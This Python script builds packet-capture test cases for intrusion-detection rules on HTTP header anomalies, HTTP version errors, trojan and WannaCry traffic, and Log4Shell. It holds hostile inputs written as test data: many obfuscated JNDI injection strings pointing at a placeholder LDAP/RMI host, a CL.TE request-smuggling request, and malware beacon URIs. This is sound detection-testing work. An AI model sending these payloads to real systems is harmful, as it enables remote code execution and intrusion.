"""Crafted HTTP/1.x traces for rules 33, 38, 69, 70, 71 and 77.

Usage: python3 gen_http1.py OUTDIR
Each test case is its own TCP connection; the client source port encodes the
case number (40000 + n) so that alerts can be mapped back to cases.
"""
import sys
from tcplib import Capture

out = sys.argv[1]
CLI, SRV = "10.0.0.1", "10.0.0.2"


def req(path="/", host="lab.example", extra=b"", method=b"GET", version=b"HTTP/1.1"):
    return (method + b" " + path.encode() + b" " + version + b"\r\nHost: " + host.encode() +
            b"\r\nUser-Agent: curl/8.5.0\r\nAccept: */*\r\n" + extra + b"\r\n")


def resp(headers, body=b"hello", status=b"HTTP/1.1 200 OK"):
    return status + b"\r\nServer: nginx\r\n" + headers + b"\r\n" + body


# ---------------------------------------------------------------- 69 / 70
c = Capture(1700000000.0)
cases = [
    # benign: one Content-Encoding after a Content-Type (old rule 69 fired)
    resp(b"Content-Type: text/html\r\nContent-Encoding: gzip\r\nContent-Length: 5\r\n"),
    # benign: one Transfer-Encoding (old rule 70 fired)
    resp(b"Content-Type: text/html\r\nTransfer-Encoding: chunked\r\n", b"5\r\nhello\r\n0\r\n\r\n"),
    # benign: one CE and one TE (the botcc/WannaCry pattern)
    resp(b"Content-Type: text/html\r\nTransfer-Encoding: chunked\r\nContent-Encoding: gzip\r\n",
         b"5\r\nhello\r\n0\r\n\r\n"),
    # benign: header-like text in the body, after the empty line
    resp(b"Content-Type: text/plain\r\nContent-Length: 90\r\n",
         b"x\r\nContent-Encoding: gzip\r\nContent-Encoding: gzip\r\nTransfer-Encoding: chunked\r\nContent-Length: 1\r\n"),
    # 69: two Content-Encoding header lines
    resp(b"Content-Type: text/html\r\nContent-Encoding: gzip\r\nContent-Encoding: gzip\r\nContent-Length: 5\r\n"),
    # 69: lower-case names (field names are case-insensitive)
    resp(b"content-type: text/html\r\ncontent-encoding: gzip\r\nCONTENT-ENCODING: deflate\r\ncontent-length: 5\r\n"),
    # 69: two codings in one Content-Encoding list
    resp(b"Content-Type: text/html\r\nContent-Encoding: gzip, gzip\r\nContent-Length: 5\r\n"),
    # 70: two Transfer-Encoding header lines
    resp(b"Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n", b"5\r\nhello\r\n0\r\n\r\n"),
    # 70: Transfer-Encoding with Content-Length
    resp(b"Transfer-Encoding: chunked\r\nContent-Length: 5\r\n", b"5\r\nhello\r\n0\r\n\r\n"),
    # 70: lower-case names, Content-Length before Transfer-Encoding
    resp(b"content-length: 5\r\ntransfer-encoding: chunked\r\n", b"5\r\nhello\r\n0\r\n\r\n"),
]
for i, r in enumerate(cases):
    c.session(CLI, SRV, 40000 + i, 80, [("c", req("/case%d" % i)), ("s", r)])
# 70: request smuggling (CL.TE) in a request
smug = (b"POST /case10 HTTP/1.1\r\nHost: lab.example\r\nContent-Length: 13\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED")
c.session(CLI, SRV, 40010, 80, [("c", smug), ("s", resp(b"Content-Length: 5\r\n"))])
c.write(out + "/69.70.http_double_encoding.pcap")

# ---------------------------------------------------------------- 71
c = Capture(1700001000.0)
ok = resp(b"Content-Length: 5\r\n")
cases = [
    [("c", req(version=b"HTTP/1.01")), ("s", resp(b"Content-Length: 5\r\n", status=b"HTTP/1.1 400 Bad Request"))],  # fire
    [("c", req()), ("s", ok)],                                                     # benign 1.1
    [("c", req(version=b"HTTP/1.0")), ("s", resp(b"Content-Length: 5\r\n", status=b"HTTP/1.0 200 OK"))],  # benign 1.0
    [("c", req()), ("s", resp(b"Content-Length: 5\r\n", status=b"HTTP/1.01 200 OK"))],  # fire: status line
    [("c", req(version=b"HTTP/1.2")), ("s", ok)],                                  # fire: unknown version
    [("c", req()), ("s", resp(b"Content-Length: 40\r\n", b"see RFC: GET / HTTP/1.01 \r\nHTTP/9.9 200\r\n"))],  # benign body
    [("c", b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")],  # benign h2c preface
]
for i, ex in enumerate(cases):
    c.session(CLI, SRV, 41000 + i, 80, ex)
c.write(out + "/71.http_version.pcap")

# ---------------------------------------------------------------- 33 / 38
c = Capture(1700002000.0)
n = 0
uris = [
    "/install/ws.exe",                         # 33 (matched before)
    "/InternetAntivirus.exe",                  # 33 (matched before)
    "/newuser.php?saff=1234",                  # 33 (missed before)
    "/gate.php?hash=8f2a0c1d",                 # 33 (missed before)
    "/install/ws.exe?v=2",                     # 33 (missed before)
    "/?action=report&pc_id=42&abbr=xp&a=1&l=en",  # 33: fragments in order
    "/reg?u=1&v=2",                            # 33: |3f| and |26| decoded
    "/",                                       # benign
    "/index.html?lang=en",                     # benign
    "/wp-content/plugins/akismet/akismet.js",  # benign (generic entry removed)
    "/fwlink/?LinkId=550986",                  # benign (generic entry removed)
]
for u in uris:
    c.session(CLI, SRV, 42000 + n, 80, [("c", req(u)), ("s", resp(b"Content-Length: 5\r\n"))])
    n += 1
hosts = [
    "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",        # 38 (matched before)
    "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",    # 38 (missed before)
    "WWW.IUQERFSODP9IFJAPOSDFJHGOSURIJFAEWRWERGWEA.COM:80", # 38: case + port
    "www.ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com.",   # 38: trailing dot
    "www.example.com",                                      # benign
    "xiuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",       # benign: not a subdomain
]
for h in hosts:
    c.session(CLI, SRV, 42000 + n, 80, [("c", req("/", host=h)), ("s", resp(b"Content-Length: 5\r\n"))])
    n += 1
c.write(out + "/33.38.trojan_wannacry.pcap")

# ---------------------------------------------------------------- 77
c = Capture(1700003000.0)
L = "${jndi:ldap://203.0.113.9:1389/a}"
cases = [
    # detected before
    req("/", extra=b"X-Test: 0\r\n").replace(b"curl/8.5.0", b"${${lower:jndi}:${lower:ldap}://203.0.113.9/a}"),
    req("/", extra=b"").replace(b"curl/8.5.0", b"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://203.0.113.9/a}"),
    req("/", extra=b"").replace(b"curl/8.5.0", b"${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}p://203.0.113.9/a}"),
    req("/?x=%24%7B%24%7B%3A%3A-j%7Dndi%3Armi%3A%2F%2F203.0.113.9%2Fa%7D"),
    # missed before
    req("/", extra=b"").replace(b"curl/8.5.0", L.encode()),
    req("/?x=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.9%3A1389%2Fa%7D"),
    req("/", extra=b"").replace(b"curl/8.5.0", b"${jndi:rmi://203.0.113.9/a}"),
    req("/", extra=b"").replace(b"curl/8.5.0", b"${jndi:dns://203.0.113.9/a}"),
    req("/", extra=b"").replace(b"curl/8.5.0", b"${j${env:DOESNOTEXIST:-}ndi:ldap://203.0.113.9/a}"),
    req("/", extra=b"X-Api-Version: " + L.encode() + b"\r\n"),
    # other headers
    req("/", extra=b"Referer: " + L.encode() + b"\r\n"),
    req("/", extra=b"Cookie: session=" + L.encode() + b"\r\n"),
    req("/", extra=b"X-Forwarded-For: ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://203.0.113.9/a}\r\n"),
    req("/", extra=b"X-Request-Id: ${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://203.0.113.9/a}\r\n"),
    # benign
    req("/search?q=%24%7Bname%7D&page=2"),
    req("/", extra=b"Referer: https://lab.example/docs/${version}/index.html\r\n"),
    req("/api/v1/items", extra=b"Cookie: theme=dark; tz=Europe/Paris\r\n"),
    req("/docs/jndi-ldap-guide.html"),
]
for i, r in enumerate(cases):
    c.session(CLI, SRV, 43000 + i, 80, [("c", r), ("s", resp(b"Content-Length: 5\r\n"))])
c.write(out + "/77.log4shell_variants.pcap")
print("ok")
